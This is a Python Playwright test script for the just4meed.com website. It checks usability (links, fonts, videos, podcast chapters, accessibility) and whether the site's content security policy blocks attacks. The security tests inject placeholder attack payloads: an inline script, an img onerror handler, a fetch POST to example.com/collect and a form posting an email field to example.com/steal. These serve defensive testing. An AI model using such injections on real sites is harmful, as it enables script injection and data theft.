#!/usr/bin/env python3
"""Browser tests for just4meed.com: security policy + usability.

Serves a copy of the site locally, then checks in a real browser that
  - visitors can see the page, follow links and watch videos (usability), and
  - injected scripts, forms, frames and connections are blocked (security).

  pip install playwright
  python3 tests/browser_tests.py --browser /usr/bin/google-chrome --name chrome
  python3 tests/browser_tests.py --browser /usr/bin/chromium --name chromium

Options: --axe path/to/axe.min.js (accessibility scan), --out DIR (screenshots + report).
"""
import argparse
import contextlib
import functools
import http.server
import json
import pathlib
import re
import shutil
import tempfile
import threading
import urllib.parse

from playwright.sync_api import sync_playwright

ROOT = pathlib.Path(__file__).resolve().parents[1]
YOUTUBE_ID = "aqz-KE-bpKQ"  # Big Buck Bunny (Blender Foundation), embeddable

YOUTUBE_EMBED = f"""<iframe
  src="https://www.youtube-nocookie.com/embed/{YOUTUBE_ID}"
  title="Sample video" width="560" height="315" loading="lazy"
  referrerpolicy="strict-origin-when-cross-origin"
  sandbox="allow-scripts allow-same-origin allow-presentation allow-popups allow-popups-to-escape-sandbox"
  allow="encrypted-media; picture-in-picture; fullscreen"
  allowfullscreen></iframe>"""

results = []


def record(group, name, status, detail=""):
    results.append({"group": group, "test": name, "status": status, "detail": detail})
    mark = {"pass": "PASS", "fail": "FAIL", "warn": "WARN", "skip": "SKIP"}[status]
    print(f"  [{mark}] {group}: {name}" + (f" ({detail})" if detail else ""))


def check(group, name, ok, detail="", soft=False):
    record(group, name, "pass" if ok else ("warn" if soft else "fail"), "" if ok else detail)
    return ok


def build_site(tmp):
    """Copy the site and add a test page that uses the documented video/link templates."""
    site = tmp / "site"
    shutil.copytree(ROOT, site, ignore=shutil.ignore_patterns(".git", ".github", "node_modules", "tests", "test-results"))
    (site / "media").mkdir(exist_ok=True)
    for f in ("sample.webm", "sample.mp4"):
        shutil.copy(ROOT / "tests" / "fixtures" / f, site / "media" / f)
    index = (site / "index.html").read_text(encoding="utf-8")
    body = f"""<main id="top"><section class="band"><div class="wrap">
<h1>Video test page</h1>
{YOUTUBE_EMBED}
<video id="webm" src="/media/sample.webm" controls muted preload="auto" width="320"></video>
<video id="mp4" src="/media/sample.mp4" controls muted preload="auto" width="320"></video>
<video id="both" controls muted preload="auto" width="320"><source src="/media/sample.webm" type="video/webm"><source src="/media/sample.mp4" type="video/mp4"></video>
<p><a id="newtab" href="/index.html" target="_blank" rel="noopener noreferrer">Open in a new tab</a></p>
</div></section></main>"""
    page = re.sub(r"<main id=\"top\">.*</main>", body, index, flags=re.S)
    (site / "video-test.html").write_text(page, encoding="utf-8")
    return site


@contextlib.contextmanager
def serve(directory):
    class Quiet(http.server.SimpleHTTPRequestHandler):
        """Static server with byte-range support, like GitHub Pages (needed to seek in audio/video)."""
        def log_message(self, *a):
            pass

        def send_head(self):
            rng = re.match(r"bytes=(\d*)-(\d*)$", self.headers.get("Range", ""))
            path = pathlib.Path(self.translate_path(self.path))
            if not rng or not path.is_file():
                return super().send_head()
            size = path.stat().st_size
            start = int(rng.group(1)) if rng.group(1) else max(0, size - int(rng.group(2)))
            end = min(int(rng.group(2)), size - 1) if rng.group(1) and rng.group(2) else size - 1
            if start >= size:
                self.send_error(416)
                return None
            f = open(path, "rb")
            f.seek(start)
            self.send_response(206)
            self.send_header("Content-Type", self.guess_type(str(path)))
            self.send_header("Content-Range", f"bytes {start}-{end}/{size}")
            self.send_header("Content-Length", str(end - start + 1))
            self.send_header("Accept-Ranges", "bytes")
            self.end_headers()
            self._remaining = end - start + 1
            return f

        def copyfile(self, source, outputfile):
            n = getattr(self, "_remaining", None)
            if n is None:
                return super().copyfile(source, outputfile)
            while n > 0:
                chunk = source.read(min(65536, n))
                if not chunk:
                    break
                outputfile.write(chunk)
                n -= len(chunk)
    handler = functools.partial(Quiet, directory=str(directory))
    class Server(http.server.ThreadingHTTPServer):
        def handle_error(self, request, client_address):
            pass  # browsers drop media/video connections early; not a test failure
    srv = Server(("127.0.0.1", 0), handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        yield f"http://127.0.0.1:{srv.server_address[1]}"
    finally:
        srv.shutdown()


def watch(page):
    """Collect policy violations and errors on a page."""
    log = {"csp": [], "errors": []}

    def on_console(msg):
        t = msg.text
        if "Content Security Policy" in t or "Content-Security-Policy" in t:
            log["csp"].append(t)
        elif msg.type == "error":
            log["errors"].append(t)
    page.on("console", on_console)
    page.on("pageerror", lambda e: log["errors"].append(str(e)))
    return log


def axe_scan(page, axe_path, g, name):
    if not (axe_path and pathlib.Path(axe_path).exists()):
        record(g, name, "skip", "axe-core not provided")
        return
    page.evaluate(pathlib.Path(axe_path).read_text(encoding="utf-8"))
    res = page.evaluate("""async () => (await axe.run(document,
        {runOnly: ['wcag2a', 'wcag2aa', 'wcag21aa']})).violations
        .filter(v => ['serious', 'critical'].includes(v.impact))
        .map(v => v.id + ' x' + v.nodes.length)""")
    check(g, name, not res, ", ".join(res))


PAGES = [("home", "/"), ("sample", "/sample/")]


def usability(browser, base, out, axe_path):
    for label, path in PAGES:
        g = f"Usability ({label} page)"
        ctx = browser.new_context(viewport={"width": 1280, "height": 900})
        page = ctx.new_page()
        log = watch(page)
        resp = page.goto(base + path, wait_until="load")
        check(g, "page loads", resp.status == 200, f"HTTP {resp.status}")
        check(g, "headline visible", page.locator("h1").first.is_visible())
        bg = page.evaluate("getComputedStyle(document.body).backgroundColor")
        check(g, "page styles applied", bg == "rgb(251, 252, 248)", f"background is {bg}")
        page.evaluate("document.fonts.ready")
        page.wait_for_timeout(500)
        fonts = page.evaluate("""() => ({
            body: document.fonts.check('17px "Atkinson Hyperlegible"'),
            display: document.fonts.check('800 40px "Bricolage Grotesque"')})""")
        check(g, "web fonts load", fonts["body"] and fonts["display"], f"loaded: {fonts}")
        broken = page.evaluate("[...document.images].filter(i => i.complete && i.naturalWidth === 0).map(i => i.src)")
        check(g, "all images load", not broken, ", ".join(broken))
        check(g, "no policy violations on a normal visit", not log["csp"], "; ".join(log["csp"])[:300])
        check(g, "no page errors", not log["errors"], "; ".join(log["errors"])[:300])

        link = page.locator('footer a[href^="mailto:"]')
        check(g, "email link present", link.count() == 1 and
              link.get_attribute("href") == "mailto:memberservice@just4meed.com")
        link.scroll_into_view_if_needed()
        covered = page.evaluate("""() => { const a = document.querySelector('footer a[href^="mailto:"]');
            const r = a.getBoundingClientRect();
            const el = document.elementFromPoint(r.left + r.width / 2, r.top + r.height / 2);
            return !(el === a || a.contains(el)); }""")
        check(g, "email link is clickable (not covered)", not covered)

        btn = page.locator(".copy-email")
        if btn.count():
            ctx.grant_permissions(["clipboard-read", "clipboard-write"], origin=base)
            btn.first.click()
            page.wait_for_timeout(300)
            label_now = btn.first.inner_text().strip()
            copied = page.evaluate("navigator.clipboard.readText().catch(() => '')")
            check(g, "Copy email button works (site script runs)",
                  label_now == "Copied!" and copied == "memberservice@just4meed.com",
                  f"button says {label_now!r}, clipboard {copied!r}")

        page.evaluate("window.scrollTo(0, 0)")
        reached = False
        for _ in range(300):  # tabbing passes through each YouTube player's controls
            page.keyboard.press("Tab")
            if page.evaluate("document.activeElement && document.activeElement.matches('footer a[href^=\"mailto:\"]')"):
                reached = True
                break
        check(g, "email link reachable by keyboard", reached)
        if reached:
            outline = page.evaluate("getComputedStyle(document.activeElement).outlineStyle")
            check(g, "keyboard focus is visible", outline not in ("none", ""), f"outline-style {outline}")
        page.screenshot(path=str(out / f"{label}-desktop.png"), full_page=True)
        axe_scan(page, axe_path, g, "accessibility scan, light mode (WCAG AA): no serious issues")
        ctx.close()

        ctx = browser.new_context(viewport={"width": 375, "height": 812}, device_scale_factor=2,
                                  is_mobile=True, has_touch=True)
        page = ctx.new_page()
        page.goto(base + path, wait_until="load")
        overflow = page.evaluate("document.documentElement.scrollWidth - document.documentElement.clientWidth")
        check(g, "mobile: no sideways scrolling", overflow <= 0, f"{overflow}px too wide")
        size = page.evaluate("parseFloat(getComputedStyle(document.querySelector('.lede') || document.body).fontSize)")
        check(g, "mobile: body text at least 16px", size >= 16, f"{size}px")
        page.screenshot(path=str(out / f"{label}-mobile.png"), full_page=True)
        ctx.close()

        ctx = browser.new_context(viewport={"width": 1280, "height": 900}, color_scheme="dark")
        page = ctx.new_page()
        page.goto(base + path, wait_until="load")
        bg = page.evaluate("getComputedStyle(document.body).backgroundColor")
        check(g, "dark mode styles applied", bg == "rgb(18, 26, 33)", f"background is {bg}")
        axe_scan(page, axe_path, g, "accessibility scan, dark mode (WCAG AA): no serious issues")
        page.screenshot(path=str(out / f"{label}-dark.png"))
        ctx.close()


def sample_content(browser, base, out):
    g = "Sample content"
    ctx = browser.new_context(viewport={"width": 1280, "height": 900})
    page = ctx.new_page()
    log = watch(page)
    page.goto(base + "/", wait_until="load")
    page.click("text=See sample lessons and videos")
    page.wait_for_load_state("load")
    check(g, "homepage button opens the sample page", page.url.rstrip("/").endswith("/sample"), page.url)

    # Jump buttons
    for target in ("shorts", "lesson", "podcast"):
        page.click(f'nav.jump a[href="#{target}"]')
        page.wait_for_timeout(400)
        top = page.evaluate(f"document.getElementById('{target}').getBoundingClientRect().top")
        check(g, f"jump button to #{target} works", -5 <= top < 200, f"section top at {top}px")

    # YouTube shorts
    frames = page.locator("iframe")
    n = frames.count()
    loaded = 0
    for k in range(n):
        frames.nth(k).scroll_into_view_if_needed()
    page.wait_for_timeout(4000)
    yt = [f for f in page.frames if "youtube-nocookie.com/embed" in f.url]
    for f in yt:
        try:
            f.wait_for_selector("video, .ytp-cued-thumbnail-overlay, .ytp-large-play-button", timeout=15000)
            text = f.evaluate("document.body.innerText")
            if not re.search(r"Error \d+|unavailable", text, re.I):
                loaded += 1
        except Exception:
            pass
    check(g, f"all {n} YouTube videos show a working player", n > 0 and loaded == n, f"{loaded} of {n} loaded")
    page.screenshot(path=str(out / "sample-videos.png"))

    # PDFs
    for a in page.locator('a[href$=".pdf"]').all()[:2]:
        href = a.get_attribute("href")
        r = page.request.get(urllib.parse.urljoin(page.url, href))
        ok = r.status == 200 and "pdf" in r.headers.get("content-type", "")
        check(g, f"PDF link works: {href}", ok, f"HTTP {r.status} {r.headers.get('content-type')}")
        check(g, f"PDF opens in a safe new tab: {href}",
              a.get_attribute("target") == "_blank" and "noopener" in (a.get_attribute("rel") or ""))

    # Podcast player and chapter buttons (needs the site script)
    page.locator("#podcast").scroll_into_view_if_needed()
    page.evaluate("document.getElementById('pod-audio').muted = true")
    page.click('.chaps button[data-t="35"]')
    page.wait_for_timeout(1500)
    st = page.evaluate("(() => { const a = document.getElementById('pod-audio'); return [a.currentTime, a.paused, a.error && a.error.code]; })()")
    check(g, "podcast chapter button jumps to 0:35 and plays", st[0] >= 35 and not st[1] and not st[2], f"audio state {st}")
    check(g, "no policy violations on the sample page", not log["csp"], "; ".join(log["csp"])[:300])
    ctx.close()


def media(browser, base, out):
    g = "Videos & links"
    ctx = browser.new_context(viewport={"width": 1280, "height": 1000})
    page = ctx.new_page()
    log = watch(page)
    page.goto(base + "/video-test.html", wait_until="load")

    # YouTube embed (documented template)
    page.locator("iframe").scroll_into_view_if_needed()
    frame = None
    for _ in range(40):
        frame = next((f for f in page.frames if "youtube-nocookie.com/embed" in f.url), None)
        if frame:
            break
        page.wait_for_timeout(250)
    if not check(g, "YouTube player frame loads", frame is not None, "frame never appeared"):
        ctx.close()
        return
    try:
        frame.wait_for_selector("video, .ytp-large-play-button, .ytp-cued-thumbnail-overlay", timeout=20000)
        player = True
    except Exception:
        player = False
    text = frame.evaluate("document.body ? document.body.innerText : ''")
    error = re.search(r"Error \d+|unavailable|not available|configuration", text, re.I)
    check(g, "YouTube player shows with no error", player and not error,
          (error.group(0) if error else "player controls never appeared") + f": {text[:120]!r}")
    yt_violations = [c for c in log["csp"] if "youtube" in c.lower() or "ytimg" in c.lower()]
    check(g, "YouTube embed needs no extra policy exceptions", not yt_violations, "; ".join(yt_violations)[:300])
    played = False
    if player:
        box = page.locator("iframe").bounding_box()
        page.mouse.click(box["x"] + box["width"] / 2, box["y"] + box["height"] / 2)
        for _ in range(30):
            page.wait_for_timeout(500)
            t = frame.evaluate("(() => { const v = document.querySelector('video'); return v ? v.currentTime : 0 })()")
            if t > 0.5:
                played = True
                break
    # YouTube often refuses automated browsers on cloud machines ("Video unavailable"), with or
    # without this policy, so this is a warning. Confirm by hand in a normal browser.
    check(g, "YouTube video plays when clicked", played,
          "did not start; YouTube may block automated browsers, check by hand", soft=True)
    page.screenshot(path=str(out / "video.png"))

    # Videos stored on the site
    # MP4 (H.264) alone doesn't play in Chromium builds without licensed codecs, so it's a warning;
    # the documented template (WebM + MP4) must play everywhere.
    for vid, soft in (("both", False), ("webm", False), ("mp4", True)):
        state = page.evaluate(f"""async () => {{ const v = document.getElementById('{vid}');
            try {{ await v.play(); }} catch (e) {{ return 'error: ' + e.message; }}
            await new Promise(r => setTimeout(r, 1200));
            return v.currentTime > 0.3 ? 'playing' : 'stuck at ' + v.currentTime; }}""")
        label = "WebM + MP4 template" if vid == "both" else vid.upper() + " only"
        check(g, f"self-hosted video plays ({label})", state == "playing", state, soft=soft)

    # New-tab link
    with page.expect_popup() as pop:
        page.click("#newtab")
    popup = pop.value
    popup.wait_for_load_state()
    check(g, "new-tab link opens", popup.url.endswith("/index.html"), popup.url)
    check(g, "new tab can't control our page (noopener)", popup.evaluate("window.opener === null"))
    ctx.close()


def security(browser, base):
    g = "Security"
    ctx = browser.new_context()
    page = ctx.new_page()
    log = watch(page)
    page.goto(base + "/", wait_until="load")

    def attempt(js):
        before = len(log["csp"])
        val = page.evaluate(js)
        page.wait_for_timeout(600)
        return val, len(log["csp"]) > before

    ran, _ = attempt("""() => { const s = document.createElement('script');
        s.textContent = 'window.__pwned = true'; document.body.append(s); return !!window.__pwned; }""")
    check(g, "injected inline script is blocked", not ran and not page.evaluate("!!window.__pwned"))

    attempt("""() => { const s = document.createElement('script');
        s.src = 'https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js'; document.body.append(s); }""")
    page.wait_for_timeout(1500)
    check(g, "injected outside script is blocked", not page.evaluate("typeof window.jQuery !== 'undefined'"))

    _, v = attempt("""() => { const d = document.createElement('div');
        d.innerHTML = '<img src=x onerror="window.__h=1">'; document.body.append(d); }""")
    check(g, "injected event handler (onerror=) is blocked", not page.evaluate("!!window.__h"))

    _, v = attempt("""() => { const f = document.createElement('iframe');
        f.src = 'https://example.com/'; document.body.append(f); }""")
    check(g, "frame from an unapproved site is blocked", v, "no violation reported")

    _, v = attempt("""() => { const i = new Image(); i.src = 'https://example.com/track.gif?visitor=1'; }""")
    check(g, "tracking image to an unapproved site is blocked", v, "no violation reported")

    res = page.evaluate("""async () => { try { await fetch('https://example.com/collect', {method: 'POST', body: 'data'});
        return 'sent'; } catch (e) { return 'blocked'; } }""")
    check(g, "sending data to another site is blocked", res == "blocked", res)

    url_before = page.url
    _, v = attempt("""() => { const f = document.createElement('form'); f.action = 'https://example.com/steal';
        f.method = 'post'; const i = document.createElement('input'); i.name = 'email'; i.value = 'x';
        f.append(i); document.body.append(f); f.submit(); }""")
    page.wait_for_timeout(800)
    check(g, "injected form can't submit", page.url == url_before and v, f"page went to {page.url}")

    _, v = attempt("""() => { const b = document.createElement('base'); b.href = 'https://example.com/';
        document.head.append(b); return document.baseURI; }""")
    check(g, "page base address can't be changed", page.evaluate("document.baseURI").startswith(base))

    _, v = attempt("""() => { const o = document.createElement('object'); o.data = 'https://example.com/x.swf';
        document.body.append(o); }""")
    check(g, "plugins/objects are blocked", v, "no violation reported")
    ctx.close()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--browser", required=True, help="path to the browser executable")
    ap.add_argument("--name", required=True, help="label for the report, e.g. chrome or chromium")
    ap.add_argument("--axe", help="path to axe.min.js for the accessibility scan")
    ap.add_argument("--out", default="test-results")
    args = ap.parse_args()
    out = pathlib.Path(args.out) / args.name
    out.mkdir(parents=True, exist_ok=True)

    with tempfile.TemporaryDirectory() as tmp, serve(build_site(pathlib.Path(tmp))) as base, \
            sync_playwright() as p:
        browser = p.chromium.launch(executable_path=args.browser, args=["--autoplay-policy=no-user-gesture-required"])
        version = browser.version
        print(f"Browser: {args.name} {version}")
        for fn in (lambda: usability(browser, base, out, args.axe),
                   lambda: sample_content(browser, base, out),
                   lambda: media(browser, base, out),
                   lambda: security(browser, base)):
            try:
                fn()
            except Exception as e:
                record("Harness", "test group crashed", "fail", repr(e)[:300])
        browser.close()

    summary = {s: sum(r["status"] == s for r in results) for s in ("pass", "fail", "warn", "skip")}
    (out / "report.json").write_text(json.dumps(
        {"browser": args.name, "version": version, "summary": summary, "results": results}, indent=2))
    print(f"\n{args.name} {version}: {summary['pass']} passed, {summary['fail']} failed, "
          f"{summary['warn']} warnings, {summary['skip']} skipped")
    raise SystemExit(1 if summary["fail"] else 0)


if __name__ == "__main__":
    main()
